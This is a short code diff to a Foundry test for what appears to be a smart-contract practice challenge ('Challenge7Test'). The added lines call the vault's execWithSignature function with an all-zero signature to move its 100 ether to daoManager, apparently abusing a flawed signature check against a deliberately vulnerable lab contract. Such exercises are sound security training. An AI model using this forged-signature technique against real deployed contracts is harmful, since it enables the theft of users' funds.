@@ -34,6 +34,8 @@ contract Challenge7Test is Test {
 
         // The vault has reached 100 ether in donations
         deal(address(vault), 100 ether);
+
+        console.log(vault.owner());
     }
 
 
@@ -45,7 +47,15 @@ contract Challenge7Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge7Test -vvvv //
         ////////////////////////////////////////////////////*/
-
+        vault.execWithSignature(
+            0, 
+            bytes32(0), 
+            bytes32(0),
+            daoManager,
+            100 ether,
+            "",
+            block.timestamp + 1
+        );
 
 
 
